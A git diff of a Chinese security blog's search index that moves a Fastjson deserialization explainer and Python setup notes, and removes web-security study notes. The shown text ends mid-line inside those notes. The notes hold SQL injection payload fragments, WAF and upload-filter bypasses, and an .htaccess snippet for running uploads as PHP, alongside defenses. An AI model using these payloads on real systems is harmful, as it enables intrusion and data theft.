@@ -1,6 +1,39 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Fastjson漏洞详解</title>
+    <url>/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是阿里巴巴开发的java语言编写的高性能json库，可以解析json格式的字符串，支持将java bean序列化为json字符串，也可以将json反序列化为java bean字符串。fastjson接口简单易用，广泛适用在缓存序列化、协议交互、web输出、安卓客户端等。目前有2个接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
+<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>fastjson提供了autotype功能，允许用户在反序列化数据中通过”@type”指定反序列化的类型，fastjson自定义的反序列化机制时会调用指定类中的getter和setter方法，那么当组件开启了autotype功能并且反序列化不可信数据的时候，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter、getter方法中。</p>
+<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
+<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>简单来说，JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
+<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p>
+<p><strong>DNS、LDAP、 CORBA对象服务、RMI！</strong></p>
+<h1 id="Fastjson漏洞总结"><a href="#Fastjson漏洞总结" class="headerlink" title="Fastjson漏洞总结"></a>Fastjson漏洞总结</h1><ol>
+<li>反序列化常用的两种方式一种基于rmi一种基于ldap</li>
+<li>RMI是一种行为，指的是Java远程方法调用</li>
+<li>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找相关的对象，并把他下载到客户端来</li>
+<li>ldap指的是轻量级目录访问协议</li>
+</ol>
+<p>存在java版本的限制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。</span><br><span class="line">在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line">基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</span><br><span class="line">在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</span><br><span class="line">可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>漏洞原理</p>
+<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+<p>通俗理解就是：漏洞是利用fastjson  autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p>
+<p>影响版本</p>
+<p>Fastjson &lt; 1.2.25</p>
+]]></content>
+      <categories>
+        <category>其他漏洞</category>
+      </categories>
+      <tags>
+        <tag>Fastjson漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HW蓝队面试</title>
     <url>/2022/03/28/HW%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/</url>
     <content><![CDATA[<span id="more"></span>
@@ -108,36 +141,42 @@
       </tags>
   </entry>
   <entry>
-    <title>Fastjson漏洞详解</title>
-    <url>/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
+    <title>Python自学笔记</title>
+    <url>/2022/02/04/Python%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<span id="more"></span>
 
-<h1 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h1><p>fastjson是阿里巴巴开发的java语言编写的高性能json库，可以解析json格式的字符串，支持将java bean序列化为json字符串，也可以将json反序列化为java bean字符串。fastjson接口简单易用，广泛适用在缓存序列化、协议交互、web输出、安卓客户端等。目前有2个接口toJsonString和parseObject来分别实现序列化和反序列化。</p>
-<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>fastjson提供了autotype功能，允许用户在反序列化数据中通过”@type”指定反序列化的类型，fastjson自定义的反序列化机制时会调用指定类中的getter和setter方法，那么当组件开启了autotype功能并且反序列化不可信数据的时候，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter、getter方法中。</p>
-<p>攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p>
-<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>简单来说，JNDI (Java Naming and Directory Interface)  是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
-<p>JNDI 是应用程序设计的 Api，JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p>
-<p><strong>DNS、LDAP、 CORBA对象服务、RMI！</strong></p>
-<h1 id="Fastjson漏洞总结"><a href="#Fastjson漏洞总结" class="headerlink" title="Fastjson漏洞总结"></a>Fastjson漏洞总结</h1><ol>
-<li>反序列化常用的两种方式一种基于rmi一种基于ldap</li>
-<li>RMI是一种行为，指的是Java远程方法调用</li>
-<li>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找相关的对象，并把他下载到客户端来</li>
-<li>ldap指的是轻量级目录访问协议</li>
-</ol>
-<p>存在java版本的限制</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于rmi的利用方式：适用jdk版本：JDK 6u132, JDK 7u131, JDK 8u121之前。</span><br><span class="line">在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。</span><br><span class="line">基于ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</span><br><span class="line">在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。</span><br><span class="line">可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。</span><br></pre></td></tr></table></figure>
+<p>自行安装pycharm</p>
+<p>自行安装anaconda</p>
+<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="1-使用conda安装虚拟环境"><a href="#1-使用conda安装虚拟环境" class="headerlink" title="1.使用conda安装虚拟环境"></a>1.使用conda安装虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行输入</span><br><span class="line">conda info -e</span><br></pre></td></tr></table></figure>
 
-<h2 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞（CVE-2017-18349）" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞（CVE-2017-18349）</h2><p>漏洞原理</p>
-<p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
-<p>通俗理解就是：漏洞是利用fastjson  autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大的影响。</p>
-<p>影响版本</p>
-<p>Fastjson &lt; 1.2.25</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327135645297.png" alt="image-20220327135645297"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python查看版本号</span><br><span class="line">python --version</span><br><span class="line">conda create -n pr python=3.7.6 </span><br><span class="line">y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pr</span><br><span class="line">conda install pip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327141528418.png" alt="image-20220327141528418"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开notebook，直接在命令行输入</span><br><span class="line">jupyter-notebook</span><br><span class="line">配置代码自动补全功能</span><br><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">继续配置</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">关掉notebook，然后再此打开，就会发现多了一处选项，打开，勾选Hinterland</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143747001.png" alt="image-20220327143747001"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143940707.png" alt="image-20220327143940707"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调整notebook的背景色</span><br><span class="line">pip install jupyterthemes</span><br><span class="line">选择主题</span><br><span class="line">jt -t onedork -f roboto -fs 16 -nfs 16 -tfs 16 -ofs 15</span><br><span class="line">重新打开</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="x2F-除法-x2F-x2F-向下取整"><a href="#x2F-除法-x2F-x2F-向下取整" class="headerlink" title="&#x2F;除法&#x2F;&#x2F;向下取整"></a>&#x2F;除法&#x2F;&#x2F;向下取整</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152252215.png" alt="image-20220327152252215"></p>
+<h2 id="取余"><a href="#取余" class="headerlink" title="%取余"></a>%取余</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152903213.png" alt="image-20220327152903213"></p>
+<h2 id="5的2次幂"><a href="#5的2次幂" class="headerlink" title="5的2次幂"></a>5的2次幂</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153153305.png" alt="image-20220327153153305"></p>
+<h2 id="5的绝对值abs-5"><a href="#5的绝对值abs-5" class="headerlink" title="-5的绝对值abs(-5)"></a>-5的绝对值abs(-5)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153306901.png" alt="image-20220327153306901"></p>
+<h2 id="十进制转十六进制hex-10"><a href="#十进制转十六进制hex-10" class="headerlink" title="十进制转十六进制hex(10)"></a>十进制转十六进制hex(10)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153508513.png" alt="image-20220327153508513"></p>
+<h2 id="二进制转十进制int-‘1001’-base-x3D-2"><a href="#二进制转十进制int-‘1001’-base-x3D-2" class="headerlink" title="二进制转十进制int(‘1001’,base&#x3D;2)"></a>二进制转十进制int(‘1001’,base&#x3D;2)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153637234.png" alt="image-20220327153637234"></p>
+<h2 id="A的ASCII码ord-‘A’"><a href="#A的ASCII码ord-‘A’" class="headerlink" title="A的ASCII码ord(‘A’)"></a>A的ASCII码ord(‘A’)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327154438608.png" alt="image-20220327154438608"></p>
+<h2 id="65对应的ASCII码chr-65"><a href="#65对应的ASCII码chr-65" class="headerlink" title="65对应的ASCII码chr(65)"></a>65对应的ASCII码chr(65)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327155252656.png" alt="image-20220327155252656"></p>
 ]]></content>
       <categories>
-        <category>其他漏洞</category>
+        <category>Python</category>
       </categories>
       <tags>
-        <tag>Fastjson漏洞</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -191,45 +230,6 @@
       </categories>
       <tags>
         <tag>Shiro框架漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python自学笔记</title>
-    <url>/2022/02/04/Python%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<p>自行安装pycharm</p>
-<p>自行安装anaconda</p>
-<h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><h2 id="1-使用conda安装虚拟环境"><a href="#1-使用conda安装虚拟环境" class="headerlink" title="1.使用conda安装虚拟环境"></a>1.使用conda安装虚拟环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行输入</span><br><span class="line">conda info -e</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327135645297.png" alt="image-20220327135645297"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python查看版本号</span><br><span class="line">python --version</span><br><span class="line">conda create -n pr python=3.7.6 </span><br><span class="line">y</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda activate pr</span><br><span class="line">conda install pip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327141528418.png" alt="image-20220327141528418"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开notebook，直接在命令行输入</span><br><span class="line">jupyter-notebook</span><br><span class="line">配置代码自动补全功能</span><br><span class="line">pip install jupyter_contrib_nbextensions</span><br><span class="line">继续配置</span><br><span class="line">jupyter contrib nbextension install --user</span><br><span class="line">关掉notebook，然后再此打开，就会发现多了一处选项，打开，勾选Hinterland</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143747001.png" alt="image-20220327143747001"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327143940707.png" alt="image-20220327143940707"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调整notebook的背景色</span><br><span class="line">pip install jupyterthemes</span><br><span class="line">选择主题</span><br><span class="line">jt -t onedork -f roboto -fs 16 -nfs 16 -tfs 16 -ofs 15</span><br><span class="line">重新打开</span><br><span class="line">jupyter-notebook</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="x2F-除法-x2F-x2F-向下取整"><a href="#x2F-除法-x2F-x2F-向下取整" class="headerlink" title="&#x2F;除法&#x2F;&#x2F;向下取整"></a>&#x2F;除法&#x2F;&#x2F;向下取整</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152252215.png" alt="image-20220327152252215"></p>
-<h2 id="取余"><a href="#取余" class="headerlink" title="%取余"></a>%取余</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327152903213.png" alt="image-20220327152903213"></p>
-<h2 id="5的2次幂"><a href="#5的2次幂" class="headerlink" title="5的2次幂"></a>5的2次幂</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153153305.png" alt="image-20220327153153305"></p>
-<h2 id="5的绝对值abs-5"><a href="#5的绝对值abs-5" class="headerlink" title="-5的绝对值abs(-5)"></a>-5的绝对值abs(-5)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153306901.png" alt="image-20220327153306901"></p>
-<h2 id="十进制转十六进制hex-10"><a href="#十进制转十六进制hex-10" class="headerlink" title="十进制转十六进制hex(10)"></a>十进制转十六进制hex(10)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153508513.png" alt="image-20220327153508513"></p>
-<h2 id="二进制转十进制int-‘1001’-base-x3D-2"><a href="#二进制转十进制int-‘1001’-base-x3D-2" class="headerlink" title="二进制转十进制int(‘1001’,base&#x3D;2)"></a>二进制转十进制int(‘1001’,base&#x3D;2)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327153637234.png" alt="image-20220327153637234"></p>
-<h2 id="A的ASCII码ord-‘A’"><a href="#A的ASCII码ord-‘A’" class="headerlink" title="A的ASCII码ord(‘A’)"></a>A的ASCII码ord(‘A’)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327154438608.png" alt="image-20220327154438608"></p>
-<h2 id="65对应的ASCII码chr-65"><a href="#65对应的ASCII码chr-65" class="headerlink" title="65对应的ASCII码chr(65)"></a>65对应的ASCII码chr(65)</h2><p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220327155252656.png" alt="image-20220327155252656"></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -484,76 +484,6 @@
       </categories>
       <tags>
         <tag>中间件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web基础总结</title>
-    <url>/2022/01/05/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="一、web"><a href="#一、web" class="headerlink" title="一、web"></a>一、web</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><h3 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web应用程序对用户输入的数据过滤不严谨，并且把用户输入的数据当作sql语句去执行。</span><br></pre></td></tr></table></figure>
-
-<h3 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反馈结果上分为</span><br><span class="line">	有回显型</span><br><span class="line">	无回显型</span><br><span class="line">攻击手法上分为</span><br><span class="line">	1.联合查询注入 union select</span><br><span class="line">	2.堆叠注入 在SQL语句中，语句的结束都是以&#x27;;&#x27;结尾，但是如果我们在&#x27;;&#x27;后面再加上一条SQL语句，两条语句会一起执行</span><br><span class="line">	3.报错注入 updatexml、floor、ExtractValue </span><br><span class="line">	ExtractValue 接收两个字符串参数，1传入xml文档，2是Xpath路径表示法表示的查找路径，语法错误就会报错</span><br><span class="line">	extracrvalue(0,concat(0x7e,database()))</span><br><span class="line">	UpdateXML 三个参数，1操作片段2xml路径3更新内容</span><br><span class="line">	updatexml(0,concat(0x7e,select database()),1)</span><br><span class="line">	floor，group by向临时表插入数据，rand多次计算报错。报错前concat中的语句被执行。</span><br><span class="line">	concat(floor(rand(0)*2),database()) x from information_schema.schemata group by </span><br><span class="line">	exp是个数学函数。</span><br><span class="line">	4.盲注</span><br><span class="line">		时间盲注    if sleep</span><br><span class="line">		布尔盲注    count，length</span><br><span class="line">	5.二次注入  sql-labs24关，插入admin‘# 修改密码，修改的是admin的密码</span><br><span class="line">	6.宽字节注入 php发送请求到mysql使用了gbk编码。%df吃掉%5c（\）</span><br><span class="line">	character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</span><br><span class="line">	7.mysql写shell用的函数outfile、dumpfile、开启log写shell</span><br><span class="line">	8.为什么参数化查询可以防止sql注入</span><br><span class="line">使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</span><br><span class="line">简单的说: 参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="sql常用语句"><a href="#sql常用语句" class="headerlink" title="sql常用语句"></a>sql常用语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查库selsct schema_name from information_schema.schemata</span><br><span class="line">查表select table_name from information_schema.tables where table_schema=&#x27;security&#x27;</span><br><span class="line">查列select column_name from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">查字段select username,password from security.users</span><br><span class="line">if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.注释符（#   --+）</span><br><span class="line">2.大小写绕过（or and ）</span><br><span class="line">3.双写绕过（oorrder）</span><br><span class="line">4.空格绕过 /**/  %09（Tab）</span><br><span class="line">5.对字符进行转义</span><br></pre></td></tr></table></figure>
-
-<h3 id="sql注入防御"><a href="#sql注入防御" class="headerlink" title="sql注入防御"></a>sql注入防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.代码层</span><br><span class="line">黑名单、白名单、敏感字符过滤、规范输出</span><br><span class="line">2.配置层</span><br><span class="line">开启gpc（php的防御函数魔术引号开关）、使用utf-8</span><br><span class="line">3.物理层面</span><br><span class="line">WAF、IPS、数据库审计</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-xss（跨站脚本攻击）"><a href="#2-xss（跨站脚本攻击）" class="headerlink" title="2.xss（跨站脚本攻击）"></a>2.xss（跨站脚本攻击）</h2><h3 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</span><br></pre></td></tr></table></figure>
-
-<h3 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.反射型</span><br><span class="line">一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。</span><br><span class="line">2.存储型</span><br><span class="line">主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。</span><br><span class="line">3.DOM型</span><br><span class="line">不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</span><br><span class="line">区别</span><br><span class="line">12都需要服务器解析，并与数据库交互3只用前端解析，不与数据库交互</span><br><span class="line">23都会将攻击代码长期存在到受害者服务器1只能攻击一次</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="xss绕过"><a href="#xss绕过" class="headerlink" title="xss绕过"></a>xss绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a标签、src属性、大小写、双写</span><br></pre></td></tr></table></figure>
-
-<h3 id="xss防护"><a href="#xss防护" class="headerlink" title="xss防护"></a>xss防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">编码、WAF、filter过滤敏感字符</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-csrf（跨站请求伪造攻击）"><a href="#3-csrf（跨站请求伪造攻击）" class="headerlink" title="3.csrf（跨站请求伪造攻击）"></a>3.csrf（跨站请求伪造攻击）</h2><h3 id="csrf原理"><a href="#csrf原理" class="headerlink" title="csrf原理"></a>csrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同一浏览器下，用户访问了攻击者的恶意链接，攻击者拿着你的“身份凭证”，冒充你进行相应的攻击。</span><br></pre></td></tr></table></figure>
-
-<h3 id="csrf防护"><a href="#csrf防护" class="headerlink" title="csrf防护"></a>csrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.验证HTTP Referer字段</span><br><span class="line">2.在请求地址中添加Token验证</span><br><span class="line">3.在HTTP头中自定义属性并验证</span><br></pre></td></tr></table></figure>
-
-<h3 id="csrf位置"><a href="#csrf位置" class="headerlink" title="csrf位置"></a>csrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码修改、点赞、删除、转账、注销</span><br></pre></td></tr></table></figure>
-
-<h2 id="4-ssrf（服务端请求伪造攻击）"><a href="#4-ssrf（服务端请求伪造攻击）" class="headerlink" title="4.ssrf（服务端请求伪造攻击）"></a>4.ssrf（服务端请求伪造攻击）</h2><h3 id="ssrf原理"><a href="#ssrf原理" class="headerlink" title="ssrf原理"></a>ssrf原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。</span><br><span class="line"></span><br><span class="line">1- 服务器允许向其他服务器获取资源</span><br><span class="line">2- 但是并没有对该地址做严格的过滤和限制</span><br><span class="line">3- 所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回</span><br></pre></td></tr></table></figure>
-
-<h3 id="ssrf原因"><a href="#ssrf原因" class="headerlink" title="ssrf原因"></a>ssrf原因</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()这三个函数运用不当。</span><br></pre></td></tr></table></figure>
-
-<h3 id="ssrf位置"><a href="#ssrf位置" class="headerlink" title="ssrf位置"></a>ssrf位置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.分享：通过URL地址分享网页内容</span><br><span class="line">2.转码服务</span><br><span class="line">3.在线翻译</span><br><span class="line">4.图片加载与下载：通过URL地址加载或下载图片</span><br><span class="line">5.图片、文章收藏功能</span><br><span class="line">6.未公开的api实现以及其他调用URL的功能</span><br><span class="line">7.从URL关键字中寻找</span><br></pre></td></tr></table></figure>
-
-<h3 id="ssrf防护"><a href="#ssrf防护" class="headerlink" title="ssrf防护"></a>ssrf防护</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">禁止302跳转、限制协议只保留HTTP、HTTPS，防止file://、gopher://和ftp://、内外网限制、URL限制</span><br><span class="line">地址做白名单</span><br></pre></td></tr></table></figure>
-
-<h3 id="csrf和ssrf区别"><a href="#csrf和ssrf区别" class="headerlink" title="csrf和ssrf区别"></a>csrf和ssrf区别</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csrf是服务器端对对用户的数据像cookie信息等重要数据没有做严格把控，使得攻击者窃取信息进行伪造发送给服务器</span><br><span class="line">ssrf是服务器对用户提供的url地址过于信任，没有检测，导致攻击者可以通过这个跳板攻击内网。</span><br></pre></td></tr></table></figure>
-
-<h2 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</span><br></pre></td></tr></table></figure>
-
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIME类型检测：HTTP请求字段里的Content-Type字段改为image/jpeg；image/png；image/gif</span><br><span class="line">黑名单绕过：php3、php4、大小写</span><br><span class="line">.htaccess绕过：1.mod_rewrite模块开启。2.AllowOverride All，该目录的文件按php来解析执行</span><br><span class="line">&lt;FilesMatch &quot;shana&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">::$DATA绕过：会把这个后面的后缀名当成文件流处理。</span><br><span class="line">点、空格、大小写、双写绕过</span><br><span class="line">图片马绕过：绕过getimagesize()方法、exif_imagetype()需要开启php的配置文件中的php_exif模块。</span><br><span 